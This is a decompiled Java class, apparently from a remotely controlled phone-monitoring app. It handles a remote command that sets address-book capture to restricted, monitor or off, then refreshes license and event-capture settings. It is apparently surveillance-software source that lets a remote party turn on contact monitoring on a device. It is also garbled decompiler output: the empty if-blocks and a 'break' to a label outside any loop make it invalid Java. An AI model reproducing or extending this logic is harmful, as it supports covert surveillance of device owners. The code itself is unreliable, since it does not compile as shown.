package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.appengine.i;
import com.vvt.base.FxAddressbookMode;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefAddressBook;
import com.vvt.preference.PrefEventsCapture;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.input.RmtCtrlInputAddressBookMode;
import com.vvt.remotecontrol.input.RmtCtrlInputAddressBookMode.Mode;
import java.util.List;

public class bx
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public boolean a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramControlCommand.getData();
    boolean bool2 = localObject1 instanceof RmtCtrlInputAddressBookMode;
    Object localObject2;
    Object localObject3;
    if (bool2)
    {
      localObject1 = (RmtCtrlInputAddressBookMode)localObject1;
      localObject2 = ((RmtCtrlInputAddressBookMode)localObject1).getMode();
      bool1 = a;
      if (bool1) {}
      localObject1 = paramh.n;
      localObject3 = FxPreferenceType.ADDRESSBOOK;
      localObject1 = (PrefAddressBook)((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject3);
      localObject3 = RmtCtrlInputAddressBookMode.Mode.RESTRICTED;
      if (localObject2 != localObject3) {
        break label189;
      }
      localObject2 = FxAddressbookMode.RESTRICTED;
      ((PrefAddressBook)localObject1).setMode((FxAddressbookMode)localObject2);
    }
    for (;;)
    {
      localObject1 = paramh.k;
      localObject2 = paramh.o;
      localObject3 = paramh.l.d();
      bool2 = ((com.vvt.license.b)localObject1).a((com.vvt.productinfo.a)localObject2, (String)localObject3);
      localObject1 = paramh.n;
      localObject3 = FxPreferenceType.EVENTS_CTRL;
      localObject1 = (PrefEventsCapture)((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject3);
      localObject3 = i.b(paramh).b();
      boolean bool3 = a;
      if (bool3) {}
      i.a(paramh, (List)localObject3, bool2, (PrefEventsCapture)localObject1);
      bool1 = a;
      if (bool1) {}
      return true;
      label189:
      localObject3 = RmtCtrlInputAddressBookMode.Mode.MONITOR;
      if (localObject2 == localObject3)
      {
        localObject2 = FxAddressbookMode.MONITOR;
        ((PrefAddressBook)localObject1).setMode((FxAddressbookMode)localObject2);
      }
      else
      {
        localObject2 = FxAddressbookMode.OFF;
        ((PrefAddressBook)localObject1).setMode((FxAddressbookMode)localObject2);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bx.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */